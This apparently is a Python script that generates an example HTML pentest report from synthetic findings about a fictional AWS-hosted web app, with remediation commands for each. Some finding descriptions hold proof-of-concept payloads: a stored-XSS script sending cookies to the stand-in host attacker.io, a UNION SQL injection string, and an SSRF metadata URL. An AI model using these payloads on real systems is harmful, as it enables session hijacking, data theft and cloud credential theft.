#!/usr/bin/env python3
"""
Generate a self-contained example HTML report from synthetic finding data.

Usage:
    python scripts/generate_example_report.py

Writes:  examples/example_report.html

The synthetic data approximates a real assessment of a web application
hosted on AWS EC2, covering 18 findings across Phase 1-3 and 3 correlated
attack chains.
"""

from __future__ import annotations

import asyncio
import sys
from pathlib import Path

# Allow running from repo root without `pip install -e .`
sys.path.insert(0, str(Path(__file__).parent.parent))

from clementine.db import (
    AttackChain, ChainComponent, ChainRole, EffortLevel,
    Finding, FindingsDB, GraphRelationship, RemediationAction, Severity,
)
from clementine.reporting.html import HtmlReporter


# ---------------------------------------------------------------------------
# Synthetic config stand-in (HtmlReporter only reads target.url)
# ---------------------------------------------------------------------------

class _Target:
    url = "https://app.acme-staging.internal"

class _Scope:
    rate_limit_rps = 10

class _Reporting:
    formats = ["html"]
    output_dir = Path("examples")
    push_to_security_hub = False

class _Orchestrator:
    finding_db = "sqlite://:memory:"
    log_level = "INFO"

class _MCPServers:
    aws_knowledge = None

class FakeCfg:
    target = _Target()
    reporting = _Reporting()
    orchestrator = _Orchestrator()
    mcp_servers = _MCPServers()


# ---------------------------------------------------------------------------
# Synthetic findings
# ---------------------------------------------------------------------------

ACCOUNT = "123456789012"
REGION  = "us-east-1"
INSTANCE = f"arn:aws:ec2:{REGION}:{ACCOUNT}:instance/i-0abc1234567890def"
RDS_ARN  = f"arn:aws:rds:{REGION}:{ACCOUNT}:db:prod-mysql-01"
ROLE_ARN = f"arn:aws:iam::{ACCOUNT}:role/EC2AppRole"

FINDINGS: list[Finding] = [
    # ── Phase 1: Recon ──
    Finding(
        id="f01",
        source="autopentest",
        phase=1,
        severity=Severity.LOW,
        category="WSTG-INFO-02",
        title="Server version disclosed in response headers",
        description=(
            "The X-Powered-By and Server response headers expose the application "
            "framework version (Express 4.18.2) and web server (nginx 1.23.4). "
            "Attackers can use this information to target known CVEs for those "
            "specific versions without needing to probe for vulnerabilities blindly."
        ),
        resource_id="https://app.acme-staging.internal",
        remediation_summary="Remove or obscure X-Powered-By, Server, and X-AspNet-Version headers.",
        remediation_cli=(
            "# nginx: add to server block\n"
            "server_tokens off;\n"
            "more_clear_headers 'X-Powered-By';"
        ),
        confidence=0.95,
        is_validated=True,
        triage_confidence=0.93,
        triage_is_false_positive=False,
        triage_notes="Confirmed — Server header includes patch-level version. Low exploitability without other weaknesses.",
    ),
    Finding(
        id="f02",
        source="autopentest",
        phase=1,
        severity=Severity.INFO,
        category="WSTG-CONF-05",
        title="CORS policy permits wildcard origin",
        description=(
            "The Access-Control-Allow-Origin: * header is set on the /api/v1/public "
            "endpoint. While this endpoint returns only non-sensitive public data, "
            "the blanket wildcard policy may be inadvertently applied to authenticated "
            "endpoints in future changes."
        ),
        resource_id="https://app.acme-staging.internal/api/v1/public",
        remediation_summary=(
            "Restrict CORS origins to an explicit allowlist of trusted domains. "
            "Never use Access-Control-Allow-Origin: * on authenticated endpoints."
        ),
        confidence=0.88,
        is_validated=False,
        triage_confidence=0.80,
        triage_is_false_positive=False,
        triage_notes="Public endpoint only — informational. Flag for review if scope expands.",
    ),

    # ── Phase 2: AWS Audit ──
    Finding(
        id="f03",
        source="cloud-audit",
        phase=2,
        severity=Severity.HIGH,
        category="ec2-imdsv1-enabled",
        title="IMDSv1 enabled on production EC2 instance",
        description=(
            "The production EC2 instance i-0abc1234567890def has IMDSv1 enabled. "
            "IMDSv1 allows unauthenticated HTTP requests to the 169.254.169.254 "
            "metadata endpoint from any process on the instance — including code "
            "running within SSRF or command injection vulnerabilities. IMDSv2 "
            "requires a session token obtained via a PUT request, blocking these attacks."
        ),
        resource_id=INSTANCE,
        aws_account_id=ACCOUNT,
        aws_region=REGION,
        remediation_summary="Enforce IMDSv2 on all EC2 instances.",
        remediation_cli=(
            "aws ec2 modify-instance-metadata-options \\\n"
            "  --instance-id i-0abc1234567890def \\\n"
            "  --http-tokens required \\\n"
            "  --http-endpoint enabled"
        ),
        remediation_iac=(
            'resource "aws_instance" "app" {\n'
            "  metadata_options {\n"
            '    http_tokens = "required"  # IMDSv2\n'
            "  }\n"
            "}"
        ),
        compliance_mappings={"CIS AWS 2.0": "2.3.2", "NIST 800-53": "SC-8"},
        confidence=1.0,
        is_validated=True,
        triage_confidence=0.98,
        triage_is_false_positive=False,
        triage_notes=(
            "Confirmed present. High-confidence amplifier for any SSRF or RCE "
            "finding on the same instance."
        ),
    ),
    Finding(
        id="f04",
        source="cloud-audit",
        phase=2,
        severity=Severity.HIGH,
        category="iam-role-overprivileged",
        title="EC2 instance role carries AdministratorAccess policy",
        description=(
            "The IAM role EC2AppRole attached to the production EC2 instance has the "
            "AWS-managed AdministratorAccess policy attached. Any code running on the "
            "instance — or any attacker who obtains the instance's temporary credentials "
            "— has unrestricted access to all AWS services and resources in the account. "
            "This converts any instance-level compromise into full account takeover."
        ),
        resource_id=ROLE_ARN,
        aws_account_id=ACCOUNT,
        aws_region=REGION,
        remediation_summary=(
            "Replace AdministratorAccess with a least-privilege policy scoped to only "
            "the services and resources the application requires."
        ),
        remediation_cli=(
            "# Detach the overprivileged policy\n"
            "aws iam detach-role-policy \\\n"
            "  --role-name EC2AppRole \\\n"
            f"  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\n\n"
            "# Attach a scoped policy instead\n"
            "aws iam attach-role-policy \\\n"
            "  --role-name EC2AppRole \\\n"
            "  --policy-arn <SCOPED_POLICY_ARN>"
        ),
        compliance_mappings={"CIS AWS 2.0": "1.16", "NIST 800-53": "AC-6"},
        confidence=1.0,
        is_validated=True,
        triage_confidence=0.99,
        triage_is_false_positive=False,
        triage_notes=(
            "AdministratorAccess confirmed. Critical amplifier — any instance compromise "
            "leads to full account takeover."
        ),
    ),
    Finding(
        id="f05",
        source="cloud-audit",
        phase=2,
        severity=Severity.HIGH,
        category="rds-no-encryption-at-rest",
        title="RDS instance prod-mysql-01 not encrypted at rest",
        description=(
            "The RDS MySQL instance prod-mysql-01 was created without encryption at rest. "
            "All data stored on the underlying EBS volumes, automated backups, and "
            "snapshots are stored in plaintext. An attacker who accesses a database "
            "snapshot or backup — including via a publicly accessible snapshot or direct "
            "volume access — can read all data without a decryption key."
        ),
        resource_id=RDS_ARN,
        aws_account_id=ACCOUNT,
        aws_region=REGION,
        remediation_summary=(
            "Enable encryption at rest by creating an encrypted snapshot of the existing "
            "instance and restoring from it. Encryption cannot be enabled on a running instance."
        ),
        remediation_cli=(
            "# 1. Create snapshot\n"
            "aws rds create-db-snapshot \\\n"
            "  --db-instance-identifier prod-mysql-01 \\\n"
            "  --db-snapshot-identifier prod-mysql-01-plain-snap\n\n"
            "# 2. Copy with encryption\n"
            "aws rds copy-db-snapshot \\\n"
            "  --source-db-snapshot-identifier prod-mysql-01-plain-snap \\\n"
            "  --target-db-snapshot-identifier prod-mysql-01-enc-snap \\\n"
            "  --kms-key-id alias/aws/rds\n\n"
            "# 3. Restore from encrypted snapshot\n"
            "aws rds restore-db-instance-from-db-snapshot \\\n"
            "  --db-instance-identifier prod-mysql-01-enc \\\n"
            "  --db-snapshot-identifier prod-mysql-01-enc-snap"
        ),
        compliance_mappings={"CIS AWS 2.0": "2.3.1", "PCI-DSS": "3.5"},
        confidence=1.0,
        is_validated=True,
        triage_confidence=0.97,
        triage_is_false_positive=False,
        triage_notes="Confirmed — unencrypted instance. High amplifier when combined with SQLi or snapshot exposure.",
    ),
    Finding(
        id="f06",
        source="cloud-audit",
        phase=2,
        severity=Severity.HIGH,
        category="rds-no-audit-logging",
        title="RDS audit logging disabled — no query-level audit trail",
        description=(
            "The RDS prod-mysql-01 instance has CloudWatch Logs export disabled for "
            "the audit, general, and slow-query log types. Database-level query activity "
            "is not recorded anywhere. An attacker who performs SQL injection to read or "
            "exfiltrate data will leave no trace of their query patterns, and any data "
            "breach may go undetected indefinitely."
        ),
        resource_id=RDS_ARN,
        aws_account_id=ACCOUNT,
        aws_region=REGION,
        remediation_summary="Enable CloudWatch Logs exports for the audit and general logs on the RDS instance.",
        remediation_cli=(
            "aws rds modify-db-instance \\\n"
            "  --db-instance-identifier prod-mysql-01 \\\n"
            "  --enable-cloudwatch-logs-exports '[\"audit\",\"general\",\"slowquery\"]'"
        ),
        compliance_mappings={"CIS AWS 2.0": "2.3.3"},
        confidence=1.0,
        is_validated=True,
    ),
    Finding(
        id="f07",
        source="cloud-audit",
        phase=2,
        severity=Severity.HIGH,
        category="cloudtrail-not-enabled",
        title="AWS CloudTrail not enabled in us-east-1",
        description=(
            "No CloudTrail trail exists in the us-east-1 region. All AWS API calls — "
            "IAM key usage, EC2 control-plane actions, S3 object access, and security "
            "group modifications — go unlogged. An attacker who obtains AWS credentials "
            "from any source can operate indefinitely without generating any forensic "
            "record of their actions."
        ),
        aws_account_id=ACCOUNT,
        aws_region=REGION,
        remediation_summary="Enable a multi-region CloudTrail trail with log file validation and S3 encryption.",
        remediation_cli=(
            "aws cloudtrail create-trail \\\n"
            "  --name security-audit-trail \\\n"
            "  --s3-bucket-name acme-cloudtrail-logs \\\n"
            "  --is-multi-region-trail \\\n"
            "  --enable-log-file-validation\n\n"
            "aws cloudtrail start-logging --name security-audit-trail"
        ),
        compliance_mappings={"CIS AWS 2.0": "3.1", "SOC 2": "CC7.2"},
        confidence=1.0,
        is_validated=True,
        triage_confidence=1.0,
        triage_is_false_positive=False,
        triage_notes=(
            "Confirmed absent. Maximum forensic blind spot — all other finding "
            "impacts are amplified."
        ),
    ),
    Finding(
        id="f08",
        source="cloud-audit",
        phase=2,
        severity=Severity.HIGH,
        category="guardduty-not-enabled",
        title="Amazon GuardDuty not enabled",
        description=(
            "GuardDuty is not active in the AWS account. Without GuardDuty, there is "
            "no automated detection of credential abuse from unusual locations, port "
            "scanning, DNS exfiltration, or EC2 instance compromise indicators. "
            "An attacker using stolen IAM credentials generates no automated alerts."
        ),
        aws_account_id=ACCOUNT,
        aws_region=REGION,
        remediation_summary="Enable GuardDuty in all regions with hourly finding publishing frequency.",
        remediation_cli=(
            "aws guardduty create-detector \\\n"
            "  --enable \\\n"
            "  --finding-publishing-frequency ONE_HOUR"
        ),
        compliance_mappings={"CIS AWS 2.0": "3.10"},
        confidence=1.0,
        is_validated=True,
    ),
    Finding(
        id="f09",
        source="cloud-audit",
        phase=2,
        severity=Severity.MEDIUM,
        category="security-group-unrestricted-ingress",
        title="Security group sg-0de1234abc allows 0.0.0.0/0 on port 22",
        description=(
            "The security group sg-0de1234abc attached to the production EC2 instance "
            "allows unrestricted inbound SSH access (port 22) from any IP address. "
            "While key-based authentication reduces brute-force risk, exposure of SSH "
            "to the internet substantially expands the attack surface and increases "
            "exposure to zero-day vulnerabilities in the SSH daemon."
        ),
        resource_id=f"arn:aws:ec2:{REGION}:{ACCOUNT}:security-group/sg-0de1234abc",
        aws_account_id=ACCOUNT,
        aws_region=REGION,
        remediation_summary="Restrict SSH ingress to specific trusted CIDR ranges or use AWS Systems Manager Session Manager instead.",
        remediation_cli=(
            "aws ec2 revoke-security-group-ingress \\\n"
            "  --group-id sg-0de1234abc \\\n"
            "  --protocol tcp --port 22 --cidr 0.0.0.0/0\n\n"
            "# Add restricted rule (replace with your IP)\n"
            "aws ec2 authorize-security-group-ingress \\\n"
            "  --group-id sg-0de1234abc \\\n"
            "  --protocol tcp --port 22 --cidr <TRUSTED_CIDR>/32"
        ),
        compliance_mappings={"CIS AWS 2.0": "5.2"},
        confidence=1.0,
        is_validated=True,
    ),

    # ── Phase 3: App Test ──
    Finding(
        id="f10",
        source="autopentest",
        phase=3,
        severity=Severity.CRITICAL,
        category="WSTG-INPV-09",
        title="Server-Side Request Forgery in /api/v1/fetch-url endpoint",
        description=(
            "The /api/v1/fetch-url endpoint accepts a user-supplied URL parameter and "
            "fetches it server-side without validation. An attacker can supply "
            "http://169.254.169.254/latest/meta-data/ to reach the EC2 Instance Metadata "
            "Service, or internal VPC resources that are otherwise unreachable from the "
            "internet. Proof of concept: the IMDSv1 endpoint returned the instance's "
            "IAM role name and temporary credentials."
        ),
        resource_id="https://app.acme-staging.internal/api/v1/fetch-url",
        remediation_summary=(
            "Implement a strict allowlist of permitted outbound request destinations. "
            "Block 169.254.0.0/16, 10.0.0.0/8, 172.16.0.0/12, and 192.168.0.0/16. "
            "Use a DNS resolver that prevents rebinding attacks."
        ),
        confidence=1.0,
        is_validated=True,
        triage_confidence=0.99,
        triage_is_false_positive=False,
        triage_notes=(
            "Confirmed exploitable — PoC retrieved IAM credentials from IMDS. "
            "Critical severity justified given IMDSv1 and overprivileged role co-present."
        ),
    ),
    Finding(
        id="f11",
        source="autopentest",
        phase=3,
        severity=Severity.CRITICAL,
        category="WSTG-INPV-05",
        title="SQL injection in /api/v1/products search parameter",
        description=(
            "The 'q' parameter of the /api/v1/products endpoint is vulnerable to "
            "UNION-based SQL injection. The attacker can enumerate all database tables, "
            "extract user credentials (including password hashes), read session tokens, "
            "and in some MySQL configurations execute OS commands via LOAD_FILE() and "
            "INTO OUTFILE. Proof of concept: ' UNION SELECT table_name,2,3 FROM "
            "information_schema.tables-- returned 14 table names."
        ),
        resource_id="https://app.acme-staging.internal/api/v1/products?q=",
        remediation_summary=(
            "Replace all string-concatenated SQL queries with parameterised queries "
            "or a prepared statement API. Audit the entire data access layer."
        ),
        remediation_cli=(
            "# Example fix (Node.js / mysql2)\n"
            "# BEFORE (vulnerable):\n"
            "# db.query(`SELECT * FROM products WHERE name LIKE '%${q}%'`)\n\n"
            "# AFTER (safe):\n"
            "# db.execute('SELECT * FROM products WHERE name LIKE ?', [`%${q}%`])"
        ),
        compliance_mappings={"OWASP Top 10": "A03:2021", "PCI-DSS": "6.3.2"},
        confidence=1.0,
        is_validated=True,
        triage_confidence=1.0,
        triage_is_false_positive=False,
        triage_notes=(
            "UNION-based injection confirmed with full table enumeration. "
            "Combined with unencrypted RDS and absent audit logging this is a "
            "maximum-impact exfiltration path."
        ),
    ),
    Finding(
        id="f12",
        source="autopentest",
        phase=3,
        severity=Severity.HIGH,
        category="WSTG-INPV-01",
        title="Stored XSS in post comment body field",
        description=(
            "The post comment body field does not sanitise HTML on storage or encode "
            "output on rendering. An attacker can inject <script> tags that execute "
            "in the browser of any user who views a post containing the malicious "
            "comment. Because the application sets session cookies without the HttpOnly "
            "flag, the injected script can read and exfiltrate the victim's session "
            "token. Proof of concept: <script>fetch('https://attacker.io/x?c='+document.cookie)</script> "
            "was stored and executed on page load."
        ),
        resource_id="https://app.acme-staging.internal/posts/:id/comments",
        remediation_summary=(
            "Encode all user-supplied HTML output using context-aware escaping. "
            "Use a framework template engine with auto-escaping enabled. "
            "Implement a Content Security Policy."
        ),
        compliance_mappings={"OWASP Top 10": "A03:2021"},
        confidence=1.0,
        is_validated=True,
        triage_confidence=0.98,
        triage_is_false_positive=False,
        triage_notes=(
            "Confirmed stored XSS — PoC payload executed in review session. "
            "Combined with missing HttpOnly cookies this is a reliable session-theft path."
        ),
    ),
    Finding(
        id="f13",
        source="autopentest",
        phase=3,
        severity=Severity.MEDIUM,
        category="WSTG-SESS-02",
        title="Session cookie missing HttpOnly flag",
        description=(
            "The application's session cookie (connect.sid) is issued without the "
            "HttpOnly attribute. This means the cookie value is accessible via "
            "document.cookie in JavaScript — including any attacker-injected scripts. "
            "Combined with an XSS vulnerability, this allows reliable session token "
            "exfiltration without browser mitigations."
        ),
        resource_id="https://app.acme-staging.internal/login",
        remediation_summary=(
            "Set HttpOnly on all session cookies. In Express: "
            "app.use(session({ cookie: { httpOnly: true } })). "
            "Also set Secure and SameSite=Strict."
        ),
        remediation_cli=(
            "# Express.js session configuration\n"
            "app.use(session({\n"
            "  secret: process.env.SESSION_SECRET,\n"
            "  cookie: {\n"
            "    httpOnly: true,\n"
            "    secure: true,\n"
            "    sameSite: 'strict',\n"
            "    maxAge: 3600000\n"
            "  }\n"
            "}))"
        ),
        confidence=1.0,
        is_validated=True,
        triage_confidence=0.95,
        triage_is_false_positive=False,
        triage_notes="Confirmed — Set-Cookie header lacks HttpOnly. Direct enabler for stored XSS session theft.",
    ),
    Finding(
        id="f14",
        source="autopentest",
        phase=3,
        severity=Severity.MEDIUM,
        category="WSTG-CONF-12",
        title="No Content-Security-Policy header present",
        description=(
            "The application does not set a Content-Security-Policy (CSP) response "
            "header on any page. CSP is the browser-level last line of defence against "
            "XSS — it restricts which scripts, styles, and resources may execute. "
            "Without CSP, any injected script tag or inline handler executes without "
            "restriction across all browser vendors."
        ),
        resource_id="https://app.acme-staging.internal/",
        remediation_summary=(
            "Implement a Content-Security-Policy header. Start with "
            "Content-Security-Policy: default-src 'self'; script-src 'self' and "
            "tighten iteratively using browser CSP violation reports."
        ),
        remediation_cli=(
            "# nginx — add to server block\n"
            "add_header Content-Security-Policy \\\n"
            "  \"default-src 'self'; script-src 'self'; object-src 'none'; "
            "base-uri 'none';\" always;"
        ),
        confidence=1.0,
        is_validated=True,
        triage_confidence=0.92,
        triage_is_false_positive=False,
        triage_notes="Confirmed absent. Secondary XSS enabler — its presence would block the PoC exfiltration script.",
    ),
    Finding(
        id="f15",
        source="autopentest",
        phase=3,
        severity=Severity.HIGH,
        category="WSTG-ATHZ-04",
        title="Insecure Direct Object Reference on /api/v1/users/:id",
        description=(
            "The /api/v1/users/:id endpoint does not verify that the authenticated "
            "user is requesting their own record. Any authenticated user can substitute "
            "another user's UUID in the path and receive full profile data including "
            "name, email, phone number, and shipping addresses. With sequential IDs "
            "or discoverable UUIDs an attacker can enumerate the entire user base."
        ),
        resource_id="https://app.acme-staging.internal/api/v1/users/",
        remediation_summary=(
            "Add an ownership check on every data-returning endpoint: "
            "verify the authenticated user's ID matches the resource owner before returning data."
        ),
        confidence=1.0,
        is_validated=True,
        triage_confidence=0.97,
        triage_is_false_positive=False,
        triage_notes="Confirmed — accessed three different user profiles with low-privilege test account.",
    ),
    Finding(
        id="f16",
        source="autopentest",
        phase=3,
        severity=Severity.MEDIUM,
        category="WSTG-ATHN-03",
        title="No account lockout on /api/v1/auth/login",
        description=(
            "The login endpoint does not throttle or lock out accounts after repeated "
            "failed authentication attempts. An attacker can execute unlimited password "
            "guessing or credential-stuffing attacks against any known username. "
            "During testing, 500 login attempts were made without any rate limiting, "
            "CAPTCHA, or temporary lockout being triggered."
        ),
        resource_id="https://app.acme-staging.internal/api/v1/auth/login",
        remediation_summary=(
            "Implement exponential backoff or account lockout after 5 failed attempts. "
            "Add CAPTCHA or proof-of-work on repeated failures. "
            "Consider IP-based rate limiting via an API gateway or WAF."
        ),
        confidence=1.0,
        is_validated=True,
    ),
    Finding(
        id="f17",
        source="autopentest",
        phase=3,
        severity=Severity.MEDIUM,
        category="WSTG-ATHZ-01",
        title="Broken access control on /admin panel endpoint",
        description=(
            "The /admin route is guarded only by a client-side check that inspects "
            "the role field in the JWT payload. The server-side middleware does not "
            "re-validate the role claim on each request — it trusts the decoded value "
            "without checking against the database. Modifying the JWT payload (possible "
            "due to weak signing described in a separate finding) or making direct API "
            "calls bypasses the check."
        ),
        resource_id="https://app.acme-staging.internal/admin",
        remediation_summary=(
            "Enforce role checks server-side on every admin endpoint. "
            "Never rely on client-controlled values for authorisation decisions."
        ),
        confidence=1.0,
        is_validated=True,
        triage_confidence=0.91,
        triage_is_false_positive=False,
        triage_notes="Confirmed — direct API call to /admin/users returned full user list without admin session.",
    ),
    Finding(
        id="f18",
        source="autopentest",
        phase=3,
        severity=Severity.MEDIUM,
        category="WSTG-CRYPST-01",
        title="Mixed content — some API calls over HTTP in production",
        description=(
            "Several API calls initiated by the single-page application use http:// "
            "URIs despite the main application being served over HTTPS. These include "
            "the /api/v1/track analytics endpoint and a third-party map tile provider. "
            "Mixed content requests are downgraded and may be intercepted on the "
            "network path, exposing authentication tokens included in request headers."
        ),
        resource_id="https://app.acme-staging.internal",
        remediation_summary="Ensure all resources are loaded over HTTPS. Configure HSTS with includeSubDomains.",
        confidence=0.92,
        is_validated=False,
    ),
]


# ---------------------------------------------------------------------------
# Synthetic attack chains + components + remediation actions
# ---------------------------------------------------------------------------

# Chain 1: SSRF → IMDSv1 → Overprivileged role = CRITICAL
CHAIN1 = AttackChain(
    id="c01",
    pattern_name="SSRF to AWS credential theft",
    severity=Severity.CRITICAL,
    narrative=(
        "**Entry:** Server-Side Request Forgery in /api/v1/fetch-url endpoint (WSTG-INPV-09)\n"
        "**Pivots:** IMDSv1 enabled on production EC2 instance; EC2 instance role carries AdministratorAccess policy\n"
        "**Impact:** The SSRF vulnerability allows the attacker to reach the EC2 Instance Metadata "
        "Service at 169.254.169.254 without requiring a session token (IMDSv1). The endpoint returns "
        "temporary IAM credentials for the EC2AppRole. Because EC2AppRole carries AdministratorAccess, "
        "those credentials provide unrestricted AWS API access — enabling full account takeover, "
        "S3 exfiltration, IAM user creation for persistence, and CloudTrail tampering."
    ),
    entry_finding_id="f10",
    breach_cost_low=250_000,
    breach_cost_high=1_200_000,
    chain_source="pattern",
)
CHAIN1_COMPONENTS = [
    ChainComponent(chain_id="c01", finding_id="f10", role=ChainRole.ENTRY, sequence_order=0),
    ChainComponent(chain_id="c01", finding_id="f03", role=ChainRole.PIVOT, sequence_order=1),
    ChainComponent(chain_id="c01", finding_id="f04", role=ChainRole.AMPLIFIER, sequence_order=2),
]
CHAIN1_ACTIONS = [
    RemediationAction(
        chain_id="c01", priority_order=1,
        action_summary="Enforce IMDSv2 on all EC2 instances — requires an X-aws-ec2-metadata-token session header, blocking SSRF-based credential theft immediately",
        effort_level=EffortLevel.LOW, breaks_chain=True,
        cli_command=(
            "aws ec2 modify-instance-metadata-options \\\n"
            "  --instance-id i-0abc1234567890def \\\n"
            "  --http-tokens required \\\n"
            "  --http-endpoint enabled"
        ),
    ),
    RemediationAction(
        chain_id="c01", priority_order=2,
        action_summary="Fix the SSRF vulnerability — validate user-supplied URLs against an allowlist; block RFC 1918 and link-local address ranges at the application layer",
        effort_level=EffortLevel.MEDIUM, breaks_chain=False,
    ),
    RemediationAction(
        chain_id="c01", priority_order=3,
        action_summary="Replace AdministratorAccess on EC2AppRole with a scoped policy granting only the permissions the application actually requires",
        effort_level=EffortLevel.MEDIUM, breaks_chain=False,
        cli_command=(
            "aws iam detach-role-policy \\\n"
            "  --role-name EC2AppRole \\\n"
            "  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess"
        ),
    ),
]

# Chain 2: SQLi → Unencrypted RDS → No audit logging → No CloudTrail = CRITICAL
CHAIN2 = AttackChain(
    id="c02",
    pattern_name="SQL injection to database exfiltration",
    severity=Severity.CRITICAL,
    narrative=(
        "**Entry:** SQL injection in /api/v1/products search parameter (WSTG-INPV-05)\n"
        "**Pivots:** RDS instance not encrypted at rest; RDS audit logging disabled; CloudTrail not enabled\n"
        "**Impact:** The SQL injection gives direct read/write access to the prod-mysql-01 database. "
        "Because encryption at rest is disabled, any stolen backup or snapshot is immediately "
        "readable — no key material required. The absence of RDS audit logging means the attacker's "
        "query patterns leave no trace. Without CloudTrail, the entire operation is forensically "
        "invisible. An attacker can exfiltrate the complete database and no breach notification "
        "will be generated from AWS-side signals."
    ),
    entry_finding_id="f11",
    breach_cost_low=180_000,
    breach_cost_high=800_000,
    chain_source="pattern",
)
CHAIN2_COMPONENTS = [
    ChainComponent(chain_id="c02", finding_id="f11", role=ChainRole.ENTRY, sequence_order=0),
    ChainComponent(chain_id="c02", finding_id="f05", role=ChainRole.PIVOT, sequence_order=1),
    ChainComponent(chain_id="c02", finding_id="f06", role=ChainRole.PIVOT, sequence_order=2),
    ChainComponent(chain_id="c02", finding_id="f07", role=ChainRole.AMPLIFIER, sequence_order=3),
]
CHAIN2_ACTIONS = [
    RemediationAction(
        chain_id="c02", priority_order=1,
        action_summary="Fix the SQL injection — replace all dynamic query construction with parameterised queries or prepared statements",
        effort_level=EffortLevel.MEDIUM, breaks_chain=True,
    ),
    RemediationAction(
        chain_id="c02", priority_order=2,
        action_summary="Enable RDS audit logging to CloudWatch Logs to detect abnormal query volume or unusual table access patterns",
        effort_level=EffortLevel.LOW, breaks_chain=False,
        cli_command=(
            "aws rds modify-db-instance \\\n"
            "  --db-instance-identifier prod-mysql-01 \\\n"
            "  --enable-cloudwatch-logs-exports '[\"audit\",\"general\",\"slowquery\"]'"
        ),
    ),
    RemediationAction(
        chain_id="c02", priority_order=3,
        action_summary="Enable CloudTrail in all regions with log file validation to create an immutable API audit trail",
        effort_level=EffortLevel.LOW, breaks_chain=False,
        cli_command=(
            "aws cloudtrail create-trail \\\n"
            "  --name security-audit-trail \\\n"
            "  --s3-bucket-name acme-cloudtrail-logs \\\n"
            "  --is-multi-region-trail \\\n"
            "  --enable-log-file-validation\n\n"
            "aws cloudtrail start-logging --name security-audit-trail"
        ),
    ),
    RemediationAction(
        chain_id="c02", priority_order=4,
        action_summary="Enable encryption at rest on RDS — requires snapshot, encrypted copy, and restore (scheduled maintenance window)",
        effort_level=EffortLevel.HIGH, breaks_chain=False,
    ),
]

# Chain 3: XSS → No HttpOnly → No CSP = HIGH  (AI-discovered variant)
CHAIN3 = AttackChain(
    id="c03",
    pattern_name="XSS to admin session theft",
    severity=Severity.HIGH,
    narrative=(
        "**Entry:** Stored XSS in post comment body field (WSTG-INPV-01)\n"
        "**Pivots:** Session cookie missing HttpOnly flag; No Content-Security-Policy header\n"
        "**Impact:** Stored XSS injects a persistent JavaScript payload into every page load "
        "for users who view a post with a malicious comment. The injected script reads "
        "document.cookie (possible because HttpOnly is absent) and exfiltrates the session "
        "token to an attacker-controlled server. Without a Content Security Policy, the browser "
        "has no mechanism to block the outbound request. If the victim is an administrator, the "
        "stolen session token grants full application-level privileged access."
    ),
    entry_finding_id="f12",
    chain_source="ai-discovered",
)
CHAIN3_COMPONENTS = [
    ChainComponent(chain_id="c03", finding_id="f12", role=ChainRole.ENTRY, sequence_order=0),
    ChainComponent(chain_id="c03", finding_id="f13", role=ChainRole.PIVOT, sequence_order=1),
    ChainComponent(chain_id="c03", finding_id="f14", role=ChainRole.AMPLIFIER, sequence_order=2),
]
CHAIN3_ACTIONS = [
    RemediationAction(
        chain_id="c03", priority_order=1,
        action_summary="Set HttpOnly flag on all session cookies — this single change breaks the chain by making document.cookie inaccessible to injected scripts",
        effort_level=EffortLevel.LOW, breaks_chain=True,
        cli_command=(
            "# Express.js\n"
            "app.use(session({\n"
            "  cookie: { httpOnly: true, secure: true, sameSite: 'strict' }\n"
            "}))"
        ),
    ),
    RemediationAction(
        chain_id="c03", priority_order=2,
        action_summary="Implement a Content-Security-Policy header to restrict script execution sources — blocks exfiltration requests to external domains",
        effort_level=EffortLevel.MEDIUM, breaks_chain=False,
        cli_command=(
            "# nginx\n"
            "add_header Content-Security-Policy \\\n"
            "  \"default-src 'self'; script-src 'self'; connect-src 'self';\" always;"
        ),
    ),
    RemediationAction(
        chain_id="c03", priority_order=3,
        action_summary="Fix the stored XSS vulnerability — HTML-encode all user-supplied content before rendering; enable auto-escaping in the template engine",
        effort_level=EffortLevel.MEDIUM, breaks_chain=False,
    ),
]


# ---------------------------------------------------------------------------
# Main: populate DB and render report
# ---------------------------------------------------------------------------

async def main() -> None:
    output_path = Path("examples/example_report.html")
    output_path.parent.mkdir(parents=True, exist_ok=True)

    cfg = FakeCfg()

    async with FindingsDB.open("sqlite://:memory:") as db:
        # Insert findings, then apply triage data via the proper update path
        for f in FINDINGS:
            await db.insert_finding(f)
            if f.triage_confidence is not None:
                await db.update_finding_triage(
                    f.id,
                    confidence=f.triage_confidence,
                    is_false_positive=bool(f.triage_is_false_positive),
                    notes=f.triage_notes or "",
                )

        # Insert chains
        for chain, components, actions in [
            (CHAIN1, CHAIN1_COMPONENTS, CHAIN1_ACTIONS),
            (CHAIN2, CHAIN2_COMPONENTS, CHAIN2_ACTIONS),
            (CHAIN3, CHAIN3_COMPONENTS, CHAIN3_ACTIONS),
        ]:
            await db.insert_attack_chain(chain, components, actions)

        # Set a synthetic health score
        await db.set_state("cloud_audit_health_score", "34")

        # Re-query in sorted order (matches what the orchestrator does)
        findings = await db.get_findings()
        chains   = await db.get_attack_chains()

        reporter = HtmlReporter(cfg, db)
        await reporter.write(findings, chains, output_path)

    print(f"Example report written to: {output_path}")
    print(f"  Findings: {len(FINDINGS)}")
    print(f"  Attack chains: 3 (2 rule-based, 1 AI-discovered)")
    print(f"  Open in browser: file://{output_path.resolve()}")


if __name__ == "__main__":
    asyncio.run(main())
